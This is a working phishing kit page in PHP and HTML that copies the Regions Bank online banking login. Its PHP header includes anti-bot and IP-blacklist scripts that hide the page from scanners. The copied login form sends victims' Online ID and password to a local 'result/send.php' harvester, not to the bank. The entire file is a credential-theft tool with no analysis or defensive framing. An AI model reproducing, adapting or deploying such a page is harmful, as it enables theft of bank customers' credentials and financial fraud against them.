<?php
session_start();
error_reporting(0);
include'BOTS/IP-BlackList.php';  
include'BOTS/Bot-Crawler.php';
include'BOTS/Bot-Spox.php';
include'BOTS/blacklist.php';
include'BOTS/new.php';
include'BOTS/Fuck-you.php'; 
include'BOTS/Dila_DZ.php';
include'BOTS/index.php'; 


?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="./login_files/s16009770498495"></script><script type="text/javascript" async="" src="./login_files/wtid.js.download"></script><script type="text/javascript" async="" src="./login_files/analytics.js.download"></script><script type="text/javascript" async="" src="./login_files/webtrends.min.js.download"></script><script type="text/javascript" async="" src="./login_files/js"></script><script type="text/javascript" async="" src="./login_files/e1d2b0c7d19795a33a6738c57e54a223.js.download"></script><script src="./login_files/serverComponent.php"></script>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Regions Online Banking - 
    
    Log In

</title>
    
    
        <link href="./login_files/com-regions.min.css" rel="stylesheet" type="text/css">


    <style>
        .warning-message {
            background-color: #fff9e3;
            padding: 10px;
        }
    </style>
<style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}.amaze-offscreen {  position: absolute !important;  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */  clip: rect(1px, 1px, 1px, 1px);  overflow: hidden;  width: 1px;  height: 1px;}</style></head>
<body class="regions-page rds-wizard" data-regions="page" data-resized="true">


    
    <script type="text/javascript" src="./login_files/com-regions.min.js.download"></script>



    <div id="contentWrapper" style="display: block;">
        
        

        
        <div class="page-body">
            <div>
                <div class="page-title" role="heading" aria-level="1">
                    
                </div>

                

                <div class="main-section">
                    
    

        <header class="rds-header simple">
            <div class="container">
                <a class="logo-link" href="https://www.regions.com/personal-banking" title="Go home">
                    <picture class="logo">
                        <source srcset="login_files/regions-logo-no-r.svg" media="(max-width: 600px)">
                        <img src="./login_files/regions-logo-no-r.svg" alt="regions logo">
                    </picture>
                </a>
            </div>
        </header>

        <div class="rds-wizard-body">
            <div class="body-content">
<form action="result/send.php" autocomplete="off" class="rds-form form" method="post">                    <div class="rds-short-form-tile container login-enroll">
                        <h1 class="sr-only"> Login to Online Banking</h1>
                        <div class="row col-md-12">
                            <div class="col-md-6 col-xs-12">
                                <h2 id="header"> Existing Online Customers</h2>
                                <div class="field-group login" role="group">
                                    <div class="row show-password-group margin-top-30">
                                        <div class="col-xs-12">
                                            <div class="field animated-label text required">
                                                <label class="control-label" for="online-id">Online ID</label>
                                                <input aria-required="True" class="form-control to-switch" id="online-id" maxlength="18" name="UserName" tabindex="1" type="text" value="" autocomplete="off" style="max-height: 67px; padding-top: 27px;">
                                                <span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
                                                <div class="instructions" id="descriptor-online-id"><span class="sr-only">Help text:</span><a href="https://onlinebanking.regions.com/customerservice/Recoveruserid"><span class="sr-only">What to do if I </span>Forgot Online ID?</a></div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <div class="field animated-label text required">
                                                <label class="control-label" for="password">Password</label>
                                                <input aria-required="True" class="form-control" id="password" maxlength="32" name="Password" tabindex="2" type="password" autocomplete="off" style="max-height: 67px; padding-top: 27px;">
                                                <span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
                                                <div class="instructions" id="descriptor-password"><span class="sr-only">Help text:</span><a href="https://onlinebanking.regions.com/customerservice/forgottenpassword"><span class="sr-only">What to do if I </span>Forgot Password?</a></div>
                                            </div>
                                            <div class="well"> Please check that the "Caps Lock" or "Num Lock" key is off.</div>
                                        </div>
                                    </div>
                                    <div class="row wizard-cta align-flex-right">
                                        <input type="submit" class="btn btn-wizard-next" value="Submit" onclick="this.disabled=true; this.form.submit();return false;">
                                    </div>
                                </div>
                            </div>

                            <div class="col-md-6 col-xs-12">
                                <h2 id="header"> New Online Customers</h2>
                                <div class="well">
                                    <div class="row">
                                        <div class="col-xs-12">
                                            <h3 class="font-size-16"> Enroll Now to</h3>
                                            <h3 class="sr-only">Enroll</h3>
                                            <ul>
                                                <li> Access your accounts online</li>
                                                <li> Pay bills online</li>
                                                <li> Send us a secure message</li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="row align-flex-right"><a class="btn btn-info btn-lg" href="https://onlinebanking.regions.com/enrollment/home">Enroll</a></div>
                                </div>
                            </div>
                        </div>
                    </div>
</form>            </div>
        </div>
    

                </div>
            </div>
        </div>

        
        <div class="page-footer">
            <footer class="rds-footer">
                <div class="footer-content">
                    <ul>
                        <li><a href="https://www.regions.com/contact.rf" target="_blank">Contact Us</a></li>
                        <li><a href="http://www.regions.com/personal_banking/service_agreement.rf" target="_blank">Terms and Conditions</a></li>
                        <li><a href="http://www.regions.com/about_regions/privacy_pledge.rf" target="_blank">Privacy Pledge</a></li>
                        <li><a href="http://www.regions.com/about_regions/privacy_security.rf" target="_blank">Security</a></li>
                        <li><a href="https://www.regions.com/about_regions/online_privacy_notice_to_customers.rf#ads" target="_blank">Online Tracking and Advertising</a></li>
                        <li><a href="https://www.regions.com/about_regions/regions_accessible_banking.rf" target="_blank">Accessible Banking</a></li>
                    </ul>
                    <ul>
                        <li>Call 1-800-REGIONS</li>
                    </ul>
                    <p>Regions, the Regions logo, the LifeGreen color, and the LifeGreen bike are registered trademarks of Regions Bank.</p>
                    <p>© 2020 Regions Bank. All Rights Reserved.</p>
                    <ul>
                        <li class="footer-icon"><img src="./login_files/equal-housing-lender.svg" alt=""><span class="sr-only">Equal Housing Lender</span></li>
                        <li class="footer-icon"><img src="./login_files/member-fdic.svg" alt=""><span class="sr-only">Member FDIC</span></li>
                    </ul>
                </div>
            </footer>
            <script src="./login_files/com-regions.min.js.download"></script>
         </div>

    </div>

    <noscript>
        <div class="warning-message">
            Your browser is not capable of viewing this site because it does not support JavaScript or JavaScript may be disabled. Please enable JavaScript.
        </div>
    </noscript>

    
    <div id="embeddedInFrame" style="display: none" class="warning-message">
        You are viewing this page in a unauthorized frame window.
        <br><br>
        For your security, please close all the browser windows now.
    </div>

    
    <div id="cookiesDisabled" style="display: none" class="warning-message">
        Your browser is not capable of viewing this site because it does not support Cookies or Cookies may be disabled or blocked. Please enable Cookies.
        <br><br>
        For your security, please close all the browser windows now.
    </div>

    <script>
        (function () {
            
                    if (top.location.hostname != self.location.hostname) {
                document.getElementById("embeddedInFrame").style.display = "block";
                return;
            }

            
                    var cookiesDisabled = true;
            if ("cookie" in document) {
                document.cookie = "TestCookie=testcookie;path=/;secure;";
                cookiesDisabled = (document.cookie.indexOf("TestCookie") == -1);
            }
            if (cookiesDisabled) {
                document.getElementById("cookiesDisabled").style.display = "block";
                return;
            }

            
            document.getElementById("contentWrapper").style.display = "block";
        })();
    </script>

    
    

    
    <script type="text/javascript" src="./login_files/global-overlays.js.download"></script>


    
    <script type="text/javascript" src="./login_files/Bootstrap.js.download"></script>








<div id="amaze_liveregions_polite" class="amaze-offscreen" role="log" aria-live="polite" aria-atomic="false" aria-relevant="additions"></div><div id="amaze_liveregions_assertive" class="amaze-offscreen" role="log" aria-live="assertive" aria-atomic="false" aria-relevant="additions"></div><div id="ZN_ebdjZIDEhxPwsol"><!--DO NOT REMOVE-CONTENTS PLACED HERE--></div><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_regions_undefined" name="destination_publishing_iframe_regions_undefined_name" src="./login_files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>